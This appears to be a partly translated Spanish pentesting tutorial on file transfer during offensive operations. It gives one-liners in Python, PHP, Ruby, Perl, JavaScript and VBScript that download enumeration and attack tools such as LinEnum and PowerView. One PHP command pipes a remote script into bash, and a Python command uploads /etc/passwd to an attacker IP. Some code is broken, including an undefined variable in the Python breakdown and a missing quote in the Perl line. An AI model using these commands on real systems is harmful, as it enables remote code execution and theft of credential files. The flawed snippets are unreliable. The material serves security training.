## Python
#### Python 2 - Descargar
```js
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

#### Python 3 - Descargar
```js
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

## PHP
`PHP`También es muy frecuente y proporciona múltiples métodos de transferencia de archivos. [Según datos de W3Techs](https://w3techs.com/technologies/details/pl-php) , PHP es utilizado por el 77,4% de todos los sitios web con un lenguaje de programación del lado del servidor conocido. Aunque la información no es precisa y el número puede ser ligeramente menor, a menudo nos encontraremos con servicios web que utilizan PHP al realizar una operación ofensiva.

#### Descarga de PHP con File_get_contents()
```js
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

Una alternativa a `file_get_contents()` y `file_put_contents()`es el [módulo fopen()](https://www.php.net/manual/en/function.fopen.php) . Podemos usar este módulo para abrir una URL, leer su contenido y guardarlo en un archivo.
#### Descarga PHP con Fopen()
```js
php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

También podemos enviar el contenido descargado a una tubería, similar al ejemplo sin archivos que ejecutamos en la sección anterior usando cURL y wget.
#### PHP descarga un archivo y canalízalo a Bash
```js
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

## Other Languages
#### Ruby - Download a File
```js
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

#### Perl - Download a File
```js
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");
```

## JavaScript
JavaScript es un lenguaje de programación o scripting que le permite implementar funciones complejas en páginas web. Como ocurre con otros lenguajes de programación, podemos usarlo para muchas cosas diferentes. El siguiente código JavaScript se basa en [esta](https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068) publicación y podemos descargar un archivo usándolo. Crearemos un archivo llamado `wget.js` y guarde el siguiente contenido:

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

Podemos usar el siguiente comando desde un símbolo del sistema de Windows o una terminal de PowerShell para ejecutar nuestro código JavaScript y descargar un archivo.
```js
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

## VBScript
[VBScript](https://en.wikipedia.org/wiki/VBScript) ("Microsoft Visual Basic Scripting Edition") es un lenguaje Active Scripting desarrollado por Microsoft que sigue el modelo de Visual Basic. VBScript se ha instalado de forma predeterminada en todas las versiones de escritorio de Microsoft Windows desde Windows 98. Se puede utilizar el siguiente ejemplo de VBScript [En base a esto](https://stackoverflow.com/questions/2973136/download-a-file-with-vbs) . Crearemos un archivo llamado `wget.vbs` y guarde el siguiente contenido:
```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```
Podemos usar el siguiente comando desde un símbolo del sistema de Windows o terminal PowerShell para ejecutar nuestro código VBScript y descargar un archivo.
#### Descargar un archivo usando VBScript y cscript.exe
```js
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

## Upload Operations using Python3
Si queremos cargar un archivo, necesitamos comprender las funciones de un lenguaje de programación particular para realizar la operación de carga. El [módulo de solicitudes](https://pypi.org/project/requests/) de Python3 le permite enviar solicitudes HTTP (GET, POST, PUT, etc.) usando Python. Podemos usar el siguiente código si queremos cargar un archivo en nuestro [servidor de carga](https://github.com/Densaugeo/uploadserver) Python3 .

#### Iniciando el módulo del servidor de carga de Python
```js
python3 -m uploadserver 
```

#### Cargar un archivo usando una frase de Python
```js
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

Dividamos este resumen en varias líneas para comprender mejor cada pieza.
```python
# To use the requests function, we need to import the module first.
import requests 

# Define the target URL where we will upload the file.
URL = "http://192.168.49.128:8000/upload"

# Define the file we want to read, open it and save it in a variable.
file = open("/etc/passwd","rb")

# Use a requests POST request to upload the file. 
r = requests.post(url,files={"files":file})
```

